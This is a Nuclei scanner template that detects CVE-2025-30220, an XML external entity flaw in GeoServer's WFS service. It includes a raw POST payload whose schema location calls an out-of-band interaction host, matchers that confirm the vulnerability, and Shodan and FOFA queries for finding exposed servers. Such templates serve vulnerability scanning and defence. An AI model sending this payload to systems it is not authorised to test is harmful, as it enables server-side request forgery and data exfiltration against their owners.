id: CVE-2025-30220

info:
  name: GeoServer WFS - XXE Processing Vulnerability
  author: iamnoooob,pdresearch
  severity: critical
  description: |
    GeoServer Web Feature Service (WFS) is vulnerable to an XML External Entity (XXE) processing attack due to improper handling of XML input. This vulnerability allows attackers to perform Out-of-Band (OOB) data exfiltration and Server-Side Request Forgery (SSRF) by exploiting the GeoTools library.
  reference:
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-jj54-8f66-c5pc
    - https://docs.geoserver.org/latest/en/user/production/config.html#production-config-external-entities
    - https://github.com/geonetwork/core-geonetwork/pull/8757
    - https://github.com/geonetwork/core-geonetwork/pull/8803
    - https://github.com/geonetwork/core-geonetwork/pull/8812
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:L
    cvss-score: 9.9
    cve-id: CVE-2025-30220
    cwe-id: CWE-611
    epss-score: 0.00047
    epss-percentile: 0.1443
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="GeoServer"
    shodan-query: html:"/geoserver/"
  tags: cve,cve2025,geoserver,xxe,oast,oob,ssrf

http:
  - raw:
      - |
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <wfs:GetFeature service="WFS" version="1.0.0"
        xmlns:wfs="http://www.opengis.net/wfs"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xmlns:topp="http://www.openplans.org/topp"
        xsi:schemaLocation="http://a http://{{interactsh-url}}/xxe.xsd"
        outputFormat="KML">
        <wfs:Query typeName="topp:states"/>
        </wfs:GetFeature>

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "dns")'
          - 'contains(body, "java.lang.NullPointerException")'
          - 'status_code == 200'
        condition: and
# digest: 490a0046304402207a8da55bbd77075780d159bf75227a10ed0f678134f579797d67ef75fd30902c02206215ae007dd17a2eeec9b0ebc5c908bb10f867ea78f9dc6ca4c792ab43fe4ac2:922c64590222798bb761d5b6d8e72950